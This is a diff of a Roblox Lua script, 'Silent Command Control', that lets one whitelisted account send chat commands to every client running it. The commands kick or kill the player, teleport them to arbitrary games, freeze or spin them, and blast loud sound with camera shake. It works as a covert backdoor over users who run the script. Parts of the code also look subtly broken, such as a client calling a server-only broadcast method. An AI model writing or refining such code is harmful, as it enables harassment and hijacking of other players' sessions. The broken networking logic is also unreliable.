@@ -1,21 +1,30 @@
---// Silent Command Control v2 - by itzC9
+--// Silent Command Control v2.2 - by itzC9
 local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local RS = game:GetService("ReplicatedStorage")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Debris = game:GetService("Debris")
+local TeleportService = game:GetService("TeleportService")
+local StarterGui = game:GetService("StarterGui")
 
+local LocalPlayer = Players.LocalPlayer
+local Character = function() return LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait() end
+
+-- Whitelist
 local WHITELIST = {
     ["C9_1234"] = true
-    }
-local SHARED_EVENT_NAME = "SilentCommand_Event_C9"
-local remote = RS:FindFirstChild(SHARED_EVENT_NAME) or Instance.new("RemoteEvent", RS)
-remote.Name = SHARED_EVENT_NAME
+}
+
+-- Shared Remote
+local REMOTE_NAME = "SilentCommand_Event_C9"
+local Remote = ReplicatedStorage:FindFirstChild(REMOTE_NAME) or Instance.new("RemoteEvent", ReplicatedStorage)
+Remote.Name = REMOTE_NAME
 
 local clientList = {}
+clientList[LocalPlayer.Name] = true
 
 local function findUser(name)
+    name = name:lower()
     for _, plr in ipairs(Players:GetPlayers()) do
-        if plr.Name:lower():sub(1, #name) == name:lower() then
+        if plr.Name:lower():sub(1, #name) == name then
             return plr
         end
     end
@@ -32,14 +41,18 @@ local function getRandomClient()
 end
 
 local spinning = false
-remote.OnClientEvent:Connect(function(sender, command, target)
+
+Remote.OnClientEvent:Connect(function(sender, command, targetName)
     if sender == LocalPlayer then return end
     if not WHITELIST[sender.Name] then return end
     if not clientList[LocalPlayer.Name] then return end
 
-    local char = LocalPlayer.Character
-    local hrp = char and char:FindFirstChild("HumanoidRootPart")
-    local hum = char and char:FindFirstChild("Humanoid")
+    local char = Character()
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+    local hum = char:FindFirstChild("Humanoid")
+    local camera = workspace.CurrentCamera
+
+    command = command:lower()
 
     if command == "kick" or command == "ban" then
         LocalPlayer:Kick("Removed by admin.")
@@ -49,8 +62,8 @@ remote.OnClientEvent:Connect(function(sender, command, target)
         hum.Health = 0
     elseif command == "bring" and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
         hrp.CFrame = sender.Character.HumanoidRootPart.CFrame
-    elseif command == "goto" and target then
-        local tgt = Players:FindFirstChild(target)
+    elseif command == "goto" and targetName then
+        local tgt = findUser(targetName)
         if tgt and tgt.Character and tgt.Character:FindFirstChild("HumanoidRootPart") then
             hrp.CFrame = tgt.Character.HumanoidRootPart.CFrame
         end
@@ -62,7 +75,7 @@ remote.OnClientEvent:Connect(function(sender, command, target)
         Debris:AddItem(s, 3)
     elseif command:sub(1, 8) == "teleport" then
         local id = tonumber(command:sub(10))
-        if id then game:GetService("TeleportService"):Teleport(id) end
+        if id then TeleportService:Teleport(id) end
     elseif command == "freeze" and hrp then
         hrp.Anchored = true
     elseif command == "spin" and hrp then
@@ -94,45 +107,52 @@ remote.OnClientEvent:Connect(function(sender, command, target)
         s.Volume = 10
         s:Play()
         Debris:AddItem(s, 5)
-        local cam = workspace.CurrentCamera
+
         for i = 1, 30 do
-            cam.CFrame = cam.CFrame * CFrame.new(math.random(-1,1), math.random(-1,1), 0)
+            camera.CFrame = camera.CFrame * CFrame.new(math.random(-1,1), math.random(-1,1), 0)
             task.wait(0.03)
         end
     end
 end)
 
-task.spawn(function()
+Players.LocalPlayer.Chatted:Connect(function(msg)
     if not WHITELIST[LocalPlayer.Name] then return end
-    Players.LocalPlayer.Chatted:Connect(function(msg)
-        local args = msg:split(" ")
-        local cmd = args[1]:lower()
-        local rawTarget = args[2]
-        if not rawTarget then return end
+    if not msg:lower():match("^%?.+") then return end
 
-        local targets = {}
-        if rawTarget == "." then
-            for _, v in ipairs(Players:GetPlayers()) do
-                if v ~= LocalPlayer and clientList[v.Name] then
-                    table.insert(targets, v)
-                end
-            end
-        elseif rawTarget == "r" then
-            local rand = getRandomClient()
-            if rand then table.insert(targets, rand) end
-        elseif rawTarget:sub(1, 5) == "user/" then
-            local name = rawTarget:sub(6)
-            local plr = findUser(name)
-            if plr then table.insert(targets, plr) end
-        end
+    local split = msg:split(" ")
+    local commandRaw = split[1]
+    local targetRaw = split[2]
+    if not commandRaw or not targetRaw then return end
 
-        local trueCommand = cmd:match("?(.+)")
-        if trueCommand then
-            for _, target in ipairs(targets) do
-                remote:FireAllClients(LocalPlayer, trueCommand, target.Name)
+    local command = commandRaw:sub(2):lower()
+    local targets = {}
+
+    if targetRaw == "." then
+        for _, v in ipairs(Players:GetPlayers()) do
+            if v ~= LocalPlayer and clientList[v.Name] then
+                table.insert(targets, v)
             end
         end
-    end)
+    elseif targetRaw == "r" then
+        local rand = getRandomClient()
+        if rand then table.insert(targets, rand) end
+    elseif targetRaw:sub(1,5) == "user/" then
+        local name = targetRaw:sub(6)
+        local plr = findUser(name)
+        if plr then table.insert(targets, plr) end
+    end
+
+    for _, target in ipairs(targets) do
+        Remote:FireAllClients(LocalPlayer, command, target.Name)
+    end
 end)
 
-clientList[LocalPlayer.Name] = true
+Players.PlayerAdded:Connect(function(plr)
+    if WHITELIST[plr.Name] then
+        StarterGui:SetCore("SendNotification", {
+            Title = "Developer:",
+            Text = "A Developer Of This Script Joins: " .. plr.Name,
+            Duration = 5
+        })
+    end
+end)
